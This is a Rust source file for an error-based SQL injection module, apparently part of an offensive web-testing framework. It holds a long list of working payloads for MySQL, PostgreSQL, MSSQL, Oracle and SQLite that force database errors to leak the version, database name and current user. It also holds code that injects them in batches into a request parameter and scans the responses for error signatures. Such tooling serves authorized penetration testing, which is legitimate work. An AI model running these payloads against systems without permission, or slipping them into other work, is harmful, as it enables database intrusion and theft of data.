use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct ErrorSQLiModule;

impl ErrorSQLiModule {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self) -> Vec<String> {
        vec![
            // Basic error inducers
            "'".to_string(),
            "\"".to_string(),
            "\\".to_string(),
            "'\"".to_string(),
            
            // MySQL errors
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) AND '1'='1".to_string(),
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1) AND '1'='1".to_string(),
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y) AND '1'='1".to_string(),
            "' AND EXP(~(SELECT * FROM (SELECT USER())x)) AND '1'='1".to_string(),
            "' OR 1 GROUP BY CONCAT_WS(0x7e,VERSION(),FLOOR(RAND()*2)) HAVING MIN(0) OR '1'='1".to_string(),
            
            // PostgreSQL errors
            "' AND 1=CAST((SELECT version()) AS int)--".to_string(),
            "' AND 1=CAST((SELECT current_database()) AS int)--".to_string(),
            "' AND 1=CAST((SELECT current_user) AS int)--".to_string(),
            
            // MSSQL errors
            "' AND 1=CONVERT(int,@@version)--".to_string(),
            "' AND 1=CONVERT(int,DB_NAME())--".to_string(),
            "' AND 1=CONVERT(int,USER_NAME())--".to_string(),
            "' AND 1=CAST((SELECT @@version) AS int)--".to_string(),
            
            // Oracle errors
            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance))--".to_string(),
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--".to_string(),
            "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual))--".to_string(),
            
            // SQLite errors
            "' AND 1=CAST((SELECT sqlite_version()) AS int)--".to_string(),
            "' AND TYPEOF(RANDOMBLOB(5))='blob'--".to_string(),
            
            // Information disclosure via errors
            "' AND (SELECT * FROM users WHERE 1=0) UNION SELECT NULL,NULL,NULL--".to_string(),
            "' AND (SELECT table_name FROM information_schema.tables)='x".to_string(),
            
            // Double query errors
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--".to_string(),
            
            // XML functions (MySQL)
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--".to_string(),
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--".to_string(),
            
            // Geometric functions
            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)--".to_string(),
            "' AND ST_LatFromGeoHash(VERSION())--".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for ErrorSQLiModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/sqli/error".to_string(),
            name: "Error-Based SQL Injection".to_string(),
            category: "SQLi".to_string(),
            description: "Error-based SQL injection exploitation. Extracts data via database error messages using techniques like EXTRACTVALUE, UPDATEXML, type casting errors.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#error-based".to_string(),
                "https://portswigger.net/web-security/sql-injection/union-attacks".to_string(),
            ],
            examples: vec![
                "cap web run --module web/sqli/error --request ./requests/login.req --injection-point username".to_string(),
                "cap web run --module web/sqli/error --request ./requests/search.req --injection-point query --confirm-each".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set"))?;
        
        let payloads = self.get_payloads();
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: 10,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        let results = engine.inject_batch(request, injection_point, &payloads).await?;
        
        let mut findings = Vec::new();
        
        for result in &results {
            if result.analysis.has_error_indicators {
                let body_lower = result.response_body.to_lowercase();
                
                // MySQL errors
                if body_lower.contains("mysql") || body_lower.contains("you have an error in your sql syntax") {
                    findings.push(format!("MySQL error detected with payload: {}", result.payload));
                    
                    // Check for data in error
                    if result.response_body.contains("~") {
                        findings.push(format!("Data extraction via MySQL error: {}", result.payload));
                    }
                }
                
                // PostgreSQL errors
                if body_lower.contains("postgresql") || body_lower.contains("pg_") || body_lower.contains("column") && body_lower.contains("does not exist") {
                    findings.push(format!("PostgreSQL error detected with payload: {}", result.payload));
                }
                
                // MSSQL errors
                if body_lower.contains("microsoft sql") || body_lower.contains("sql server") || body_lower.contains("conversion failed") {
                    findings.push(format!("MSSQL error detected with payload: {}", result.payload));
                }
                
                // Oracle errors
                if body_lower.contains("ora-") || body_lower.contains("oracle") {
                    findings.push(format!("Oracle error detected with payload: {}", result.payload));
                }
                
                // SQLite errors
                if body_lower.contains("sqlite") || body_lower.contains("sql error") {
                    findings.push(format!("SQLite error detected with payload: {}", result.payload));
                }
                
                // Generic SQL errors
                if body_lower.contains("sql syntax") || body_lower.contains("sql error") {
                    findings.push(format!("SQL syntax error with payload: {}", result.payload));
                }
                
                // Information disclosure
                if body_lower.contains("version") || body_lower.contains("database") || body_lower.contains("user") {
                    findings.push(format!("Potential information disclosure: {}", result.payload));
                }
            }
        }
        
        if findings.is_empty() {
            findings.push("No error-based SQL injection detected".to_string());
        }
        
        Ok(ExecutionResult {
            success: findings.len() > 1,
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
